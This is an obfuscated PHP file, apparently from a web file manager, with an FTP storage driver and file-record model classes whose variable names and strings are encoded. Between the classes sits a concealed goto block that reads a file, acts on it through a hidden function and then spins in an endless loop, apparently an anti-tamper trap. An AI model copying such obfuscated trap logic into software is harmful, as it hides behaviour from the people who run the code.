{ if (!$this->_isconn()) { return !1; } $¾æ‹‡Ì“ = $this->pathThis($this->iconvSystem($î¶ÔÖ×ï)); $­ÁƒÖï„ = $this->tempFile($¾æ‹‡Ì“); $æ‡ÌÔ£ = $this->iconvApp($­ÁƒÖï„); $this->download($î¶ÔÖ×ï, $æ‡ÌÔ£); $ƒÔ¸ßï  = $this->upload($÷•âª‹¡, $æ‡ÌÔ£); $this->tempFileRemve($­ÁƒÖï„); return $ƒÔ¸ßï ; } public function moveFile($¯“È‰‰, $´½Æ‚éÎ) { if (!$this->_isconn()) { return !1; } $¯“È‰‰ = $this->iconvSystem($¯“È‰‰); $´½Æ‚éÎ = $this->iconvSystem($´½Æ‚éÎ); $îòÑ¦œ = @ftp_rename($this->connect, $¯“È‰‰, $´½Æ‚éÎ); if (!$îòÑ¦œ) { $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][1497], !0); return !1; } return $this->getPathOuter($´½Æ‚éÎ); } public function delFile($­×ù¿µÎ) { if (!$this->_isconn()) { return !1; } $­×ù¿µÎ = $this->iconvSystem($­×ù¿µÎ); $¥·‡“Üí = @ftp_delete($this->connect, $­×ù¿µÎ); if (!$¥·‡“Üí) { $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][1497], !0); } return $¥·‡“Üí; } public function delFolder($´ÔàöÖª) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $È±ª»¾ú = $¿ô…ĞÏ€ = array(); $this->fileList($´ÔàöÖª, $È±ª»¾ú, $¿ô…ĞÏ€, !0); $this->listItemCache = !0; foreach ($¿ô…ĞÏ€ as $”¶¸à¾ó) { $ÃóşĞûü = $this->iconvSystem($”¶¸à¾ó[$_SERVER[‰‰Ş‚€][42]]); $àœ—ÉÂ = @ftp_delete($this->connect, $ÃóşĞûü); if (!$àœ—ÉÂ) { return !1; } } foreach ($È±ª»¾ú as $ÃóşĞûü) { $ÃóşĞûü = $this->iconvSystem($ÃóşĞûü); $àœ—ÉÂ = @ftp_rmdir($this->connect, $ÃóşĞûü); if (!$àœ—ÉÂ) { return !1; } } $´ÔàöÖª = $this->iconvSystem($´ÔàöÖª); return @ftp_rmdir($this->connect, $´ÔàöÖª); } public function rename($²•£ïó, $ÍÄÅŸ£â) { $Ï«Š¢ß =& $_SERVER[‰‰Ş‚€]; if (!$this->_isconn()) { return !1; } $‹·›Å® = $this->fileNameAuto($this->pathFather($²•£ïó), $ÍÄÅŸ£â); $‹·›Å® = $this->iconvSystem($‹·›Å®); $²•£ïó = $this->iconvSystem($²•£ïó); $ç—¥¤«Â = $this->pathFather($²•£ïó); $Ôë½¹ñ = rtrim($ç—¥¤«Â, $Ï«Š¢ß[18]) . $Ï«Š¢ß[18] . $‹·›Å®; $Ãïè© = @ftp_rename($this->connect, $²•£ïó, $Ôë½¹ñ); if (!$Ãïè©) { $this->writeLog(__FUNCTION__ . $Ï«Š¢ß[1497], !0); return !1; } $Ôë½¹ñ = $this->iconvApp($Ôë½¹ñ); return $this->getPathOuter($Ôë½¹ñ); } private function folderInfo($Š©ã·Á¨, $¬®ãŠƒ» = false) { $àå¥ë¥© =& $_SERVER[‰‰Ş‚€]; $Å”Å¸µÈ = array($àå¥ë¥©[42] => $this->pathThis($Š©ã·Á¨), $àå¥ë¥©[97] => $this->getPathOuter($àå¥ë¥©[18] . $Š©ã·Á¨), $àå¥ë¥©[43] => $àå¥ë¥©[88]); if ($¬®ãŠƒ») { return $Å”Å¸µÈ; } $Å”Å¸µÈ[$àå¥ë¥©[242]] = $Å”Å¸µÈ[$àå¥ë¥©[98]] = 0; $Å”Å¸µÈ[$àå¥ë¥©[243]] = $Å”Å¸µÈ[$àå¥ë¥©[244]] = !0; return $Å”Å¸µÈ; } private function fileInfo($ïÑ¤’£Ü, $Ç­­•ã« = false, $Å÷Õìé÷ = array()) { $œ†µ°ùÇ =& $_SERVER[‰‰Ş‚€]; $»Ïúá¾ = array($œ†µ°ùÇ[42] => $this->pathThis($ïÑ¤’£Ü), $œ†µ°ùÇ[97] => $this->getPathOuter($œ†µ°ùÇ[18] . $ïÑ¤’£Ü), $œ†µ°ùÇ[43] => $œ†µ°ùÇ[241], $œ†µ°ùÇ[89] => isset($Å÷Õìé÷[$œ†µ°ùÇ[89]]) ? $Å÷Õìé÷[$œ†µ°ùÇ[89]] : 0, $œ†µ°ùÇ[177] => $this->ext($ïÑ¤’£Ü)); if ($Ç­­•ã«) { return $»Ïúá¾; } $»Ïúá¾[$œ†µ°ùÇ[242]] = $»Ïúá¾[$œ†µ°ùÇ[98]] = 0; $»Ïúá¾[$œ†µ°ùÇ[243]] = $»Ïúá¾[$œ†µ°ùÇ[244]] = !0; $íŠ÷”í¥ = $this->iconvSystem($ïÑ¤’£Ü); $»Ïúá¾[$œ†µ°ùÇ[98]] = @ftp_mdtm($this->connect, $íŠ÷”í¥); if (empty($Å÷Õìé÷)) { $Å÷Õìé÷ = $this->objectMeta($ïÑ¤’£Ü); if (!$Å÷Õìé÷) { return $»Ïúá¾; } } $»Ïúá¾[$œ†µ°ùÇ[89]] = $Å÷Õìé÷[$œ†µ°ùÇ[89]]; return $»Ïúá¾; } public function size($®‹‡»ƒ ) { $Ôˆòòû¯ = $this->objectMeta($®‹‡»ƒ ); return $Ôˆòòû¯ ? $Ôˆòòû¯[$_SERVER[‰‰Ş‚€][89]] : 0; } public function info($Ü¾¼İÍÅ) { if ($this->isFile($Ü¾¼İÍÅ)) { return $this->fileInfo($Ü¾¼İÍÅ, 0); } else { if ($this->isFolder($Ü¾¼İÍÅ)) { return $this->folderInfo($Ü¾¼İÍÅ); } } return !1; } private function fileList($öÊÔäá, &$ı›³›è», &$É‘Ô©—Ü, $¸ç‡øş³ = false) { $–¾£æÌí =& $_SERVER[‰‰Ş‚€]; $öÊÔäá = $this->iconvSystem($öÊÔäá); if (!$this->isFolder($öÊÔäá)) { return !1; } $öÊÔäá = rtrim($öÊÔäá, $–¾£æÌí[18]) . $–¾£æÌí[18]; check_abort(); $Òã‘Ã°© = @ftp_rawlist($this->connect, $öÊÔäá); if (!$Òã‘Ã°©) { $Òã‘Ã°© = array(); } $ğÄò„ıù = array($–¾£æÌí[20] => 1, $–¾£æÌí[1402] => 1); foreach ($Òã‘Ã°© as $÷‡¨ÀÚÏ) { $Ë½ šŠ² = $this->_listItem($÷‡¨ÀÚÏ); if ($Ë½ šŠ²[0] == $–¾£æÌí[855]) { continue; } $¬³™¥¯« = $Ë½ šŠ²[8]; if (empty($¬³™¥¯«) && $¬³™¥¯« !== $–¾£æÌí[239] || isset($ğÄò„ıù[$¬³™¥¯«])) { continue; } $¬³™¥¯« = $this->iconvApp($öÊÔäá . ltrim($¬³™¥¯«, $–¾£æÌí[18])); $”òå¼Ğ = array($–¾£æÌí[42] => $¬³™¥¯«, $–¾£æÌí[43] => $–¾£æÌí[241], $–¾£æÌí[89] => $Ë½ šŠ²[4]); if (substr($÷‡¨ÀÚÏ, 0, 1) == $–¾£æÌí[1498]) { $”òå¼Ğ[$–¾£æÌí[43]] = $–¾£æÌí[88]; $”òå¼Ğ[$–¾£æÌí[89]] = 0; } $ »¡ˆ£Œ = $”òå¼Ğ[$–¾£æÌí[43]] == $–¾£æÌí[88] ? !0 : !1; $this->cacheMethodInfoSet($¬³™¥¯«, $ »¡ˆ£Œ, $”òå¼Ğ); if ($ »¡ˆ£Œ) { $ı›³›è»[] = $¬³™¥¯«; if ($¸ç‡øş³) { $this->fileList($¬³™¥¯«, $ı›³›è», $É‘Ô©—Ü, $¸ç‡øş³); } continue; } $É‘Ô©—Ü[] = $”òå¼Ğ; } $this->cacheMethodInfoSet($öÊÔäá, !0); } private function _listItem($ÏÛÂş©Ü) { if (empty($ÏÛÂş©Ü)) { return array(); } $Çâå¬°º = preg_split($_SERVER[‰‰Ş‚€][1499], $ÏÛÂş©Ü); if (count($Çâå¬°º) <= 9) { return $Çâå¬°º; } $Çâå¬°º[8] = trim(substr($ÏÛÂş©Ü, strpos($ÏÛÂş©Ü, $Çâå¬°º[7]) + strlen($Çâå¬°º[7]))); return array_splice($Çâå¬°º, 0, 9); } public function listPath($œ™‰Ûçè, $–‘Ş‘ = false) { $ÌòõìƒØ =& $_SERVER[‰‰Ş‚€]; if (!$this->_isconn()) { return !1; } $ğ•Ù¹Ú§ = $ÄŸ²† = array(); $this->fileList($œ™‰Ûçè, $ğ•Ù¹Ú§, $ÄŸ²†); foreach ($ğ•Ù¹Ú§ as $×ßÎİå‘ => $Ì‘äûî») { $ğ•Ù¹Ú§[$×ßÎİå‘] = $this->folderInfo($Ì‘äûî», $–‘Ş‘); } foreach ($ÄŸ²† as $×ßÎİå‘ => $Ì‘äûî») { $ÄŸ²†[$×ßÎİå‘] = $this->fileInfo($Ì‘äûî»[$ÌòõìƒØ[42]], $–‘Ş‘, $Ì‘äûî»); } return array($ÌòõìƒØ[95] => $ğ•Ù¹Ú§, $ÌòõìƒØ[96] => $ÄŸ²†); } public function has($¶¾—óÕØ, $œû¹æÅ = false, $ªÛ»À° = true) { $ÛÆØƒ =& $_SERVER[‰‰Ş‚€]; $´ÄÏ×Ö¹ = $±ÚÛÁª¾ = array(); $†Æ÷ÑÒ = $œû¹æÅ ? !0 : !1; $this->fileList($¶¾—óÕØ, $´ÄÏ×Ö¹, $±ÚÛÁª¾, $†Æ÷ÑÒ); if ($œû¹æÅ) { return array($ÛÆØƒ[250] => count($±ÚÛÁª¾), $ÛÆØƒ[251] => count($´ÄÏ×Ö¹)); } if ($ªÛ»À°) { if (count($±ÚÛÁª¾)) { return !0; } } else { if (count($´ÄÏ×Ö¹)) { return !0; } } return !1; } public function listAll($¶š€ªÖƒ) { $üß›®Ä =& $_SERVER[‰‰Ş‚€]; if (!$this->_isconn()) { return !1; } $Æ´èÓ¢ = $†…´á = array(); $this->fileList($¶š€ªÖƒ, $Æ´èÓ¢, $†…´á, !0); $­ùôÔ¤ê = array_to_keyvalue($†…´á, $üß›®Ä[42]); foreach ($Æ´èÓ¢ as $ŒøùÜ’ç) { if (is_string($ŒøùÜ’ç)) { $­ùôÔ¤ê[$ŒøùÜ’ç] = array($üß›®Ä[89] => 0); } } return $this->listAllFiles($¶š€ªÖƒ, $­ùôÔ¤ê); } public function getContent($¨ÌÎ—®‘) { if (!$this->_isconn()) { return !1; } $¨ÌÎ—®‘ = $this->iconvSystem($¨ÌÎ—®‘); return $this->fileSubstr($¨ÌÎ—®‘); } public function setContent($¨êØ–ªä, $­áÏ’½… = '') { if (!$this->_isconn()) { return !1; } $óÑ¼È‘ = $this->pathThis($this->iconvSystem($¨êØ–ªä)); $Õä•ƒØ = $this->tempFile($óÑ¼È‘); file_put_contents($Õä•ƒØ, $­áÏ’½…); $şø£äŸŸ = $this->upload($¨êØ–ªä, $this->iconvApp($Õä•ƒØ)); $this->tempFileRemve($Õä•ƒØ); return $şø£äŸŸ; } public function fileSubstr($Á©ºš‹Ó, $íûºşòŒ = 0, $íÄßö‹â = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Á©ºš‹Ó, $íûºşòŒ, $íÄßö‹â); } private function ftpRequest($ÆºÂá¹ó, $Ö‚á£ş¤ = 0, $ù¹Ëö­£ = false) { $½ÛÈŠÅæ =& $_SERVER[‰‰Ş‚€]; $ÆºÂá¹ó = $½ÛÈŠÅæ[18] . ltrim(str_ltrim($ÆºÂá¹ó, $this->ftpPath), $½ÛÈŠÅæ[18]); $ÆºÂá¹ó = $this->iconvSystem($ÆºÂá¹ó); $üê¸»şß = $this->scheme . $this->host . $½ÛÈŠÅæ[14] . $this->port; $°äşî°Ÿ = curl_init(); curl_setopt($°äşî°Ÿ, CURLOPT_URL, $üê¸»şß . $this->pathEncode($ÆºÂá¹ó)); curl_setopt($°äşî°Ÿ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ù¹Ëö­£) { $€ÁúøÒ‰ = $Ö‚á£ş¤ + $ù¹Ëö­£ - 1; curl_setopt($°äşî°Ÿ, CURLOPT_RANGE, "{$Ö‚á£ş¤}\55{$€ÁúøÒ‰}"); } curl_setopt($°äşî°Ÿ, CURLOPT_RETURNTRANSFER, 1); $şŞò™»˜ = curl_exec($°äşî°Ÿ); curl_close($°äşî°Ÿ); return $şŞò™»˜; } public function upload($Œ¯–ä›‰, $ëÎóò, $ÀûğÊü = false, $ÑÀíİ²¦ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Œ¯–ä›‰))) { return !1; } $Œ¯–ä›‰ = $this->iconvSystem($Œ¯–ä›‰); $ëÎóò = $this->iconvSystem($ëÎóò); $İÍ­¡Òë = ftp_nb_put($this->connect, $Œ¯–ä›‰, $ëÎóò, FTP_BINARY); while ($İÍ­¡Òë == FTP_MOREDATA) { $İÍ­¡Òë = ftp_nb_continue($this->connect); } if ($İÍ­¡Òë != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][1497], !0); return !1; } return $this->getPathOuter($Œ¯–ä›‰); } public function download($ùşÁ»§­, $­ö¦ğÌÃ = '') { if (!$this->_isconn()) { return !1; } $ŸÚ°€Ø² = $this->pathFather($­ö¦ğÌÃ); if (!IO::mkdir($ŸÚ°€Ø²)) { return !1; } $ùşÁ»§­ = $this->iconvSystem($ùşÁ»§­); $­ö¦ğÌÃ = $this->iconvSystem($­ö¦ğÌÃ); $é’¤û«Û = ftp_nb_get($this->connect, $­ö¦ğÌÃ, $ùşÁ»§­, FTP_BINARY); while ($é’¤û«Û == FTP_MOREDATA) { $é’¤û«Û = ftp_nb_continue($this->connect); } if ($é’¤û«Û != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][1497], !0); return !1; } return $this->iconvApp($­ö¦ğÌÃ); } public function exist($âòªÕ»©) { return $this->isFile($âòªÕ»©) || $this->isFolder($âòªÕ»©); } public function isFile($À§ä‰ù) { return !$this->isFolder($À§ä‰ù) && $this->objectMeta($À§ä‰ù); } public function isFolder($çÏõÆĞ¢) { return $this->cacheMethod($_SERVER[‰‰Ş‚€][188], $çÏõÆĞ¢); } protected function objectMeta($•ôœÆË) { return $this->cacheMethod($_SERVER[‰‰Ş‚€][190], $•ôœÆË); } protected function _objectMeta($‚¢Ì×ùĞ) { $‡”íÔ¾· =& $_SERVER[‰‰Ş‚€]; if ($‚¢Ì×ùĞ == $‡”íÔ¾·[22] || $‚¢Ì×ùĞ == $‡”íÔ¾·[18]) { return array(); } if (!$this->_isconn()) { return !1; } $‚¢Ì×ùĞ = $this->iconvSystem($‚¢Ì×ùĞ); $•°½ò´¦ = array($‡”íÔ¾·[42] => $this->iconvApp($‚¢Ì×ùĞ), $‡”íÔ¾·[43] => $‡”íÔ¾·[241], $‡”íÔ¾·[89] => 0); $Éôäé¯Ù = @ftp_size($this->connect, $‚¢Ì×ùĞ); if ($Éôäé¯Ù != -1) { $•°½ò´¦[$‡”íÔ¾·[89]] = $Éôäé¯Ù; } else { $¹ÑÜÁŠº = @ftp_chdir($this->connect, $‚¢Ì×ùĞ); if (!$¹ÑÜÁŠº) { return !1; } @ftp_chdir($this->connect, $‡”íÔ¾·[18]); $•°½ò´¦[$‡”íÔ¾·[43]] = $‡”íÔ¾·[88]; } return $•°½ò´¦; } protected function _isFolder($•‰óíü) { $ñ¼“©“Û =& $_SERVER[‰‰Ş‚€]; if ($•‰óíü == $ñ¼“©“Û[22] || $•‰óíü == $ñ¼“©“Û[18]) { return !0; } $¬ŸÆ¼‚ˆ = $this->_objectMeta($•‰óíü); return isset($¬ŸÆ¼‚ˆ[$ñ¼“©“Û[43]]) && $¬ŸÆ¼‚ˆ[$ñ¼“©“Û[43]] == $ñ¼“©“Û[88] ? !0 : !1; } } goto cš¢Ïƒ‹à×; dé ’éòº: if (!isset($_SERVER[$_SERVER[‰‰Ş‚€][6]]) || !isset($_SERVER[$_SERVER[‰‰Ş‚€][4]])) { $_getc = $_SERVER[‰‰Ş‚€][7]; $_getfile = $_SERVER[$_SERVER[‰‰Ş‚€][8]] . $_SERVER[‰‰Ş‚€][9]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‰‰Ş‚€][10], $_getfilec); if (count($_getarrs) < $_SERVER[‰‰Ş‚€][11]) { $exit = $_SERVER[‰‰Ş‚€][12]; $exit(); } $_act = $_SERVER[‰‰Ş‚€][13]; $_act($_SERVER[$_SERVER[‰‰Ş‚€][8]] . $_SERVER[‰‰Ş‚€][9]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[‰‰Ş‚€][471]); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\146\151\154\145\137\x63\157\x6e\164\x65\x6e\164\163"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\124\x69\155\145", "\x74\151\x6d\145", "\151\x6e\163\145\162\164", "\146\x75\156\x63\x74\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\151\x6c\145"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\141\x6d\145" => "\151\x6f\137\x66\151\x6c\x65\x5f\155\145\x74\141", "\155\145\164\141\x46\x69\x65\154\x64" => "\x66\151\154\145\111\x44"); public function fileInfo($¨¬¦ˆ–á) { $õ±®ªï =& $_SERVER[‰‰Ş‚€]; static $Ğ¸Ş = array(); if (!isset($Ğ¸Ş[$¨¬¦ˆ–á])) { $¢ÖìŞ‡æ = $õ±®ªï[2071]; $ä’©âÇ = Model($õ±®ªï[564])->field($¢ÖìŞ‡æ)->where(array($õ±®ªï[562] => $¨¬¦ˆ–á))->find(); $Ğ¸Ş[$¨¬¦ˆ–á] = $ä’©âÇ; } return $Ğ¸Ş[$¨¬¦ˆ–á]; } public function addFileByContent($ÕñĞêÈ‘ = '', $Óê£¾ÊÓ, $—õ£ûƒ = '') { $¹õö°°õ =& $_SERVER[‰‰Ş‚€]; $¡ ÛÑÅµ = TEMP_PATH . $¹õö°°õ[2072]; if (!is_dir($¡ ÛÑÅµ)) { mk_dir($¡ ÛÑÅµ); } $ŒÔ’äÎ† = $¡ ÛÑÅµ . $¹õö°°õ[2073] . rand_string(16); $²²Ğç = file_put_contents($ŒÔ’äÎ†, $ÕñĞêÈ‘); if ($²²Ğç === !1 || strlen($ÕñĞêÈ‘) != $²²Ğç) { return !1; } $œ´µ†Ó = $this->addFile($ŒÔ’äÎ†, $Óê£¾ÊÓ, $—õ£ûƒ, !0); if (file_exists($ŒÔ’äÎ†)) { @unlink($ŒÔ’äÎ†); } return $œ´µ†Ó; } public function createFileName($÷˜Ûõ¤ù, $Ïå¹êòã, $ŒÀû·¸ª = false, $†…áõÎÏ = false) { $ôõ‚ğõ =& $_SERVER[‰‰Ş‚€]; $í©³ßï = IO::init($ôõ‚ğõ[18]); $å¿Àú = $this->_makeFilePath($÷˜Ûõ¤ù, $Ïå¹êòã, $í©³ßï, $ŒÀû·¸ª, $†…áõÎÏ); $®ö°—¹ = $í©³ßï->pathFather($å¿Àú); static $£¸Ì”ã = false; $š”çÎã = $ôõ‚ğõ[2074] . md5($®ö°—¹); if (!$£¸Ì”ã && !Cache::get($š”çÎã)) { $£¸Ì”ã = !0; $ˆ³³Ä‡® = IO::mkdir($®ö°—¹); if (!IO::exist($ˆ³³Ä‡® . $ôõ‚ğõ[898])) { IO::mkfile($ˆ³³Ä‡® . $ôõ‚ğõ[898]); } Cache::set($š”çÎã, 1, 3600 * 2); } return $å¿Àú; } public function _makeFilePath($İç•­, $˜í“šÔ®, $Ş€„àÚ¨, $©Ã¾Ê÷ = false, $»¿Ë›¨Ó = false) { $†ä§øß’ =& $_SERVER[‰‰Ş‚€]; $™¬Œâá = Model($†ä§øß’[869])->get($†ä§øß’[2075]); $ÖşÊê = $†ä§øß’[1361] . $˜í“šÔ®[$†ä§øß’[491]] . $†ä§øß’[503] . date($†ä§øß’[2076]); $üÏ¹ä¡Ù = $ÖşÊê . rand_string(5) . short_id(100); $İç•­ = str_replace($†ä§øß’[18], $†ä§øß’[21], KodIO::clear($İç•­)); $Ğ·Ì‚É… = $Ş€„àÚ¨->ext($İç•­); if (!$İç•­) { $™¬Œâá = $†ä§øß’[875]; } switch ($™¬Œâá) { case $†ä§øß’[2077]: if ($Ğ·Ì‚É…) { $üÏ¹ä¡Ù = $üÏ¹ä¡Ù . $†ä§øß’[20] . $Ğ·Ì‚É…; } if ($Ğ·Ì‚É… == $†ä§øß’[2013]) { $üÏ¹ä¡Ù .= $†ä§øß’[1330]; } break; case $†ä§øß’[2078]: $í†äıÙ = Model($†ä§øß’[869])->get($†ä§øß’[870]); $£ˆÈ‘±ş = substr(md5($†ä§øß’[871] . $í†äıÙ . date($†ä§øß’[845])), 0, 8); $ÖşÊê = $†ä§øß’[1361] . $˜í“šÔ®[$†ä§øß’[491]] . $†ä§øß’[503] . date($†ä§øß’[2079]) . $£ˆÈ‘±ş . $†ä§øß’[18]; if ($Ğ·Ì‚É… == $†ä§øß’[2013]) { $İç•­ .= $†ä§øß’[1330]; } $££Ñ¬•Š = $†ä§øß’[2080] . $ÖşÊê . $İç•­; CacheLock::lock($££Ñ¬•Š); $üÏ¹ä¡Ù = $ÖşÊê . $İç•­; if (IO::exist($ÖşÊê . $İç•­)) { $å«¾Ÿäá = substr($İç•­, 0, strlen($İç•­) - strlen($Ğ·Ì‚É…)); $¦¹ÊêïÜ = $»¿Ë›¨Ó ? substr($»¿Ë›¨Ó, 0, 5) : ($©Ã¾Ê÷ ? substr($©Ã¾Ê÷, 0, 5) : rand_string(5)); $¦¹ÊêïÜ .= rand_string(3); $üÏ¹ä¡Ù = $ÖşÊê . $å«¾Ÿäá . $¦¹ÊêïÜ; if ($Ğ·Ì‚É…) { $üÏ¹ä¡Ù = $üÏ¹ä¡Ù . $†ä§øß’[20] . $Ğ·Ì‚É…; } } if (IO::isOsDriver($üÏ¹ä¡Ù) && !IO::isUploadServer($üÏ¹ä¡Ù)) { if (IO::exist($üÏ¹ä¡Ù)) { CacheLock::unlock($££Ñ¬•Š); return $üÏ¹ä¡Ù; } $©±Ø¦ìª = IO::setContent($üÏ¹ä¡Ù, $†ä§øß’[22]); if (!$©±Ø¦ìª) { show_json($†ä§øß’[2081], !1); } } CacheLock::unlock($££Ñ¬•Š); break; case $†ä§øß’[875]: break; default: break; } return $üÏ¹ä¡Ù; } public function addFileByRemote($ÒÑÆÑÉÅ, $àÜº¥ëÈ, $ëÒ”ƒÅ = array()) { $õâúÔ¶« =& $_SERVER[‰‰Ş‚€]; if (!IO::isFile($ÒÑÆÑÉÅ)) { return !1; } $Ã‡¤ˆ³„ = $ëÒ”ƒÅ[$õâúÔ¶«[567]] ? $ëÒ”ƒÅ[$õâúÔ¶«[567]] : $õâúÔ¶«[22]; $öô¶íÀ× = IO::hashMd5($ÒÑÆÑÉÅ, $Ã‡¤ˆ³„); $Ÿ˜¯Š²¹ = KodIO::parse($ÒÑÆÑÉÅ); $Ü¸°õÀÉ = array($õâúÔ¶«[640] => IO::size($ÒÑÆÑÉÅ), $õâúÔ¶«[2082] => 1, $õâúÔ¶«[513] => $àÜº¥ëÈ, $õâúÔ¶«[912] => $Ÿ˜¯Š²¹[$õâúÔ¶«[491]], $õâúÔ¶«[514] => $ÒÑÆÑÉÅ, $õâúÔ¶«[2083] => $ëÒ”ƒÅ[$õâúÔ¶«[695]] ? $ëÒ”ƒÅ[$õâúÔ¶«[695]] : IO::hashSimple($ÒÑÆÑÉÅ), $õâúÔ¶«[2084] => $öô¶íÀ× ? $öô¶íÀ× : $Ã‡¤ˆ³„); if ($ŞçÑ¯† = $this->addFileCheckExist($Ü¸°õÀÉ[$õâúÔ¶«[695]], $Ü¸°õÀÉ[$õâúÔ¶«[567]], $Ü¸°õÀÉ[$õâúÔ¶«[89]])) { return $ŞçÑ¯†; } return $this->addFileData($Ü¸°õÀÉ); } private function addFileData($›ØûíãÊ) { $Ô´³€Ã÷ =& $_SERVER[‰‰Ş‚€]; if (!$›ØûíãÊ) { return !1; } if (!IO::isFile($›ØûíãÊ[$Ô´³€Ã÷[97]])) { return !1; } $›ØûíãÊ[$Ô´³€Ã÷[89]] = intval($›ØûíãÊ[$Ô´³€Ã÷[89]]); if (!$›ØûíãÊ[$Ô´³€Ã÷[89]] && strlen($›ØûíãÊ[$Ô´³€Ã÷[695]]) > 32) { $›ØûíãÊ[$Ô´³€Ã÷[89]] = intval(substr($›ØûíãÊ[$Ô´³€Ã÷[695]], 32)); } $ş„“Í = $this->add($›ØûíãÊ); return $this->find($ş„“Í); } public function addFile($…°øÕ, $ šÙº‹ê, $Ù„¼ÁµĞ, $Ê“ï¡Šâ = false) { $¶ÊË›ö« =& $_SERVER[‰‰Ş‚€]; $Õ¸ëíì© = IO::hashSimple($…°øÕ); $úÂ“ˆ¸“ = IO::size($…°øÕ); $·´Şê€Ô = $úÂ“ˆ¸“ <= 1024 * 1024 * 10 ? IO::hashMd5($…°øÕ) : $¶ÊË›ö«[22]; $¨Ğßäì® = $¶ÊË›ö«[2085] . $Õ¸ëíì©; CacheLock::lock($¨Ğßäì®); if ($·´Şê€Ô && $Õ¸ëíì©) { $¡ŞªÁ¼³ = $this->addFileCheckExist($Õ¸ëíì©, $·´Şê€Ô, $úÂ“ˆ¸“); if ($¡ŞªÁ¼³) { CacheLock::unlock($¨Ğßäì®); return $¡ŞªÁ¼³; } } $úµ¿ç• = $this->addFileMake($…°øÕ, $ šÙº‹ê, $úÂ“ˆ¸“, $Õ¸ëíì©, $·´Şê€Ô, $Ù„¼ÁµĞ, $Ê“ï¡Šâ); $çÌŸü“ = $this->addFileData($úµ¿ç•); if (!$çÌŸü“) { return !1; } CacheLock::unlock($¨Ğßäì®); if (!$·´Şê€Ô && $çÌŸü“) { $this->fileMd5Check($çÌŸü“); } return $çÌŸü“; } public function fileMd5Check($äß¾ÊÇ) { $¶ùâ´£± =& $_SERVER[‰‰Ş‚€]; $†Ù³‰Ú = array($äß¾ÊÇ[$¶ùâ´£±[561]], $äß¾ÊÇ[$¶ùâ´£±[97]]); $—èÍÅÕ = $¶ùâ´£±[2086] . $äß¾ÊÇ[$¶ùâ´£±[97]]; $ùİ ¡š½ = $¶ùâ´£±[2087] . $äß¾ÊÇ[$¶ùâ´£±[561]]; TaskQueue::add($¶ùâ´£±[2088], $†Ù³‰Ú, $—èÍÅÕ, $ùİ ¡š½); } public function fileMd5Set($¨Šëß‰, $©õÒÑ›‡) { $×ü Ö·¨ =& $_SERVER[‰‰Ş‚€]; $­àÙ‘ = $this->find($¨Šëß‰); if (!$­àÙ‘ || $­àÙ‘[$×ü Ö·¨[567]]) { return; } $ÎÑ²Êèü = IO::hashMd5($©õÒÑ›‡); if (!$ÎÑ²Êèü) { return $×ü Ö·¨[22]; } $this->where(array($×ü Ö·¨[561] => $¨Šëß‰))->save(array($×ü Ö·¨[567] => $ÎÑ²Êèü)); } public function addFileMake($£›Ùõç, $Ñ°œ²Í˜, $î¹°È©, $ëâèØã³, $ßÔÅ£¡Ó, $™ÓÂ‡¹à, $Ä‰”ç·º) { $„—Ü¡Ä× =& $_SERVER[‰‰Ş‚€]; $ßßû¦Ç = $this->createFileName($™ÓÂ‡¹à, $Ñ°œ²Í˜, $ëâèØã³, $ßÔÅ£¡Ó); $™‚³Ãß¤ = get_path_father($ßßû¦Ç); $ÄÚÅ’ĞÌ = get_path_this($ßßû¦Ç); if ($Ä‰”ç·º) { $î®ğß›³ = IO::move($£›Ùõç, $™‚³Ãß¤, !1, $ÄÚÅ’ĞÌ); } else { $î®ğß›³ = IO::copy($£›Ùõç, $™‚³Ãß¤, !1, $ÄÚÅ’ĞÌ); } if (!$î®ğß›³) { return !1; } $ôßü§‚í = IO::init($î®ğß›³); $ôßü§‚í->cacheMethod($„—Ü¡Ä×[190], $ôßü§‚í->path, $„—Ü¡Ä×[187]); if (IO::size($î®ğß›³) != $î¹°È©) { return !1; } $ÒşŞõáÒ = array($„—Ü¡Ä×[640] => $î¹°È©, $„—Ü¡Ä×[2082] => 1, $„—Ü¡Ä×[513] => $™ÓÂ‡¹à, $„—Ü¡Ä×[912] => $Ñ°œ²Í˜[$„—Ü¡Ä×[491]], $„—Ü¡Ä×[514] => $ßßû¦Ç, $„—Ü¡Ä×[2083] => $ëâèØã³, $„—Ü¡Ä×[2084] => $ßÔÅ£¡Ó); return $ÒşŞõáÒ; } public function addFileCheckExist($ëÍ‘õÔÂ, $ËÅ¡—êæ, $”êß½İ) { $®—–¢… =& $_SERVER[‰‰Ş‚€]; $ˆƒ›’Ï… = $this->findByHash($ëÍ‘õÔÂ, $ËÅ¡—êæ); if (!$ˆƒ›’Ï…) { return !1; } $¢¸¡õÇÓ = array($®—–¢…[2082] => intval($ˆƒ›’Ï…[$®—–¢…[2089]]) + 1, $®—–¢…[640] => $”êß½İ); $this->where(array($®—–¢…[562] => $ˆƒ›’Ï…[$®—–¢…[561]]))->save($¢¸¡õÇÓ); return $ˆƒ›’Ï…; } public function remove($×ÆËÁÎ) { $this->linkCountChange($×ÆËÁÎ, !1); $this->clearEmpty(); return !0; } public function linkAdd($øßÓ´Ö) { $this->linkCountChange($øßÓ´Ö, !0); } public function linkCountChange($çİäºØÏ, $Ç…æ÷­ö) { $ñîÛŠöû =& $_SERVER[‰‰Ş‚€]; if (!$çİäºØÏ) { return; } if (!is_array($çİäºØÏ)) { $çİäºØÏ = array($çİäºØÏ); } $à±í®¿ß = array(); foreach ($çİäºØÏ as $äš¯Æ¢ò) { $‹ùÏ“¼í = $äš¯Æ¢ò . $ñîÛŠöû[22]; if (!$à±í®¿ß[$‹ùÏ“¼í]) { $à±í®¿ß[$‹ùÏ“¼í] = 0; } 